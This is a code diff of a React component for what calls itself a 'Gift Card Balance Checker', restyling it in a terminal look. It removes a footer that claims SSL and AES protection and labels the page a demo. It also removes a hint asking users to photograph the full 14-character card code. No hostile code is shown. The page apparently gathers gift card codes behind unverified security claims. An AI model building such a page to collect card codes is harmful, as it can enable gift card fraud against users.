+            <button onClick={resetFullScreen} className="w-full mt-4 bg-transparent border border-[#555] text-[#888] py-2 font-bold text-xs tracking-widest uppercase transition-colors hover:text-white hover:border-white" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
+              Reset Terminal
             </button>
           )}
 
           {message && !isProcessing && !showFullScreenBalance && (
-            <div className={`mt-3 sm:mt-4 text-center p-3 sm:p-4 rounded-lg sm:rounded-xl ${messageType === 'success' ? 'bg-[#0a2a0a] text-[#00ff41]' : 'bg-[#2a0a0a] border border-[#ff5555]'}`}>
-              <div className={`${messageType === 'error' ? 'text-[#ff5555] text-[0.7rem] sm:text-sm whitespace-pre-line' : 'text-[#00ff41] text-sm sm:text-base'}`}>
-                {message}
-              </div>
+            <div className={`mt-6 p-4 border font-mono text-[0.7rem] sm:text-sm whitespace-pre-line ${messageType === 'success' ? 'bg-[#00ff41]/10 border-[#00ff41] text-[#00ff41]' : 'bg-[#ff3333]/10 border-[#ff3333] text-[#ff3333]'}`} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}>
+              {message}
             </div>
           )}
-
-          <div className="bg-[#0f0f0f] rounded-lg p-2 sm:p-2.5 text-center text-[0.55rem] sm:text-[0.6rem] text-[#aaa] mt-3 sm:mt-4">
-            💡 Upload a clear photo. Make sure all 14 alphanumeric characters are visible.<br/>
-            {attemptCount === 0 
-              ? 'First attempt: Image will be cleared if unclear. Please re-upload a clearer photo.' 
-              : attemptCount === 1 
-                ? 'Second attempt: Ensure the card is perfectly flat and well-lit.' 
-                : 'Final attempt: Upload the clearest possible image.'}
-          </div>
-        </div>
-
-        <div className="text-center text-[#555] text-[0.5rem] sm:text-[0.55rem] py-3 sm:py-4 mt-2 sm:mt-3 border-t border-[#1a1a1a]">
-          <p>© 2026 Gift Card Balance Checker. All rights reserved.</p>
-          <p className="mt-0.5 sm:mt-1">Secure SSL Encrypted • 256-bit AES Protection • Demo Tool</p>
         </div>
       </div>
 
       <style>{`
-        @keyframes fadeSlideUp {
-          from { opacity: 0; transform: translateY(8px); }
-          to { opacity: 1; transform: translateY(0); }
-        }
-        .animate-fadeSlideUp {
-          animation: fadeSlideUp 0.4s ease;
-        }
-        .active\\:scale-98:active {
-          transform: scale(0.98);
-        }
-        .whitespace-pre-line {
-          white-space: pre-line;
-        }
-        body {
-          overflow-x: hidden;
-          position: relative;
-          width: 100%;
-          margin: 0;
-          padding: 0;
-        }
-        html {
-          overflow-x: hidden;
-          max-width: 100%;
-        }
-        * {
-          -webkit-tap-highlight-color: transparent;
-        }
+        @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+        .animate-fadeSlideUp { animation: fadeSlideUp 0.4s ease; }
+        .active\\:scale-98:active { transform: scale(0.98); }
+        .whitespace-pre-line { white-space: pre-line; }
+        body { background-color: #050505; overflow-x: hidden; width: 100%; margin: 0; padding: 0; color: white; }
+        html { overflow-x: hidden; max-width: 100%; }
+        * { -webkit-tap-highlight-color: transparent; }
       `}</style>
     </>
   );
